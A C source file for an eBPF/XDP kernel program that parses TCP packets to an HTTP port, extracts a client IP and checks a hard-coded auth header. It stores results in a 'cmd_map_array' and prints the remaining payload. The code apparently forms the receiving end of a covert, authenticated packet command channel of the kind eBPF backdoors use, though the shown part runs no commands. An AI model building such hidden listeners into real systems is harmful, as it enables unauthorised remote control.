#include "nyako_kern.h"

SEC("nyako_kern")
int process_packet(struct xdp_md *ctx)
{
  int action = XDP_PASS;

  struct ethhdr *ethh;
  struct iphdr *iph;
  struct tcphdr *tcph;

  struct hdr_cursor header;

  int ip_hlen, tcp_hlen, eth_hlen;
  unsigned int payload_len, ip_len;

  void *data_end = (void *)(long)ctx->data_end;
  void *data = (void *)(long)ctx->data;

  unsigned char *payload;
  unsigned short tot_len;

  struct cmd_details *record;
  __u32 key;

  // start next header cursor position at data start
  header.pos = data;

  // parse eth header
  ethh = header.pos;
  eth_hlen = ETH_HLEN;
  if (header.pos + eth_hlen > data_end)
    goto out;

  header.pos += eth_hlen;

  if (ethh->h_proto < 0)
  {
    action = XDP_ABORTED;
    goto out;
  }

  if (ethh->h_proto != bpf_htons(ETH_P_IP))
  {
    goto out;
  }

  // parse ip header
  if (header.pos + sizeof(*iph) > data_end)
    goto out;

  iph = header.pos;

  ip_hlen = iph->ihl * 4;

  if (ip_hlen < sizeof(*iph))
  {
    action = XDP_ABORTED;
    goto out;
  }

  header.pos += ip_hlen;

  if (iph->protocol != IPPROTO_TCP)
  {
    goto out;
  }

  // parse tcp header
  if ((header.pos + sizeof(*tcph)) > data_end)
  {
    goto out;
  }

  tcph = header.pos;
  tcp_hlen = tcph->doff * 4;

  if (tcp_hlen < sizeof(*tcph))
  {
    goto out;
  }

  if (bpf_ntohs(tcph->dest) != HTTP_PORT)
  {
    goto out;
  }

  // parse tcp data
  header.pos += tcp_hlen;

  tot_len = bpf_ntohs(iph->tot_len);

  if (tot_len > 0xffff)
  {
    action = XDP_ABORTED;
    goto out;
  }

  payload_len = tot_len - (ip_hlen + tcp_hlen);
  if (payload_len == 0)
  {
    goto out;
  }

  if ((header.pos + CLIENT_IP_OFFSET + IP_BUF_SIZE) > data_end)
  {
    goto out;
  }

  payload = (unsigned char *)(header.pos + CLIENT_IP_OFFSET);

  ip_len = 0;
  key = 0;

  record = bpf_map_lookup_elem(&cmd_map_array, &key);

  if (record == NULL)
  {
    action = XDP_ABORTED;
    goto out;
  }

  // set client ip
  for (unsigned int i = 0; i < IP_BUF_SIZE; i++)
  {
    if (payload[i] == '\r')
    {
      record->ip[i] = '\0';
      payload += i;
      break;
    }

    record->ip[i] = payload[i];
  }

  // skip other headers
  if (((void *)payload + EXTRA_HEADER_SIZE) > data_end)
  {
    goto out;
  }
  payload += EXTRA_HEADER_SIZE;

  // check auth header
  if (((void *)payload + AUTH_HEADER_SIZE) > data_end)
  {
    goto out;
  }

  for (unsigned int i = 0; i < AUTH_HEADER_SIZE; i++)
  {
    if (payload[i] != *(AUTH_HEADER + i))
    {
      goto out;
    }
  }

  payload += AUTH_HEADER_SIZE;

  // check message type
  bpf_printk("%s", payload);

out:
  return action;
}

char _license[] SEC("license") = "Dual MIT/GPL";
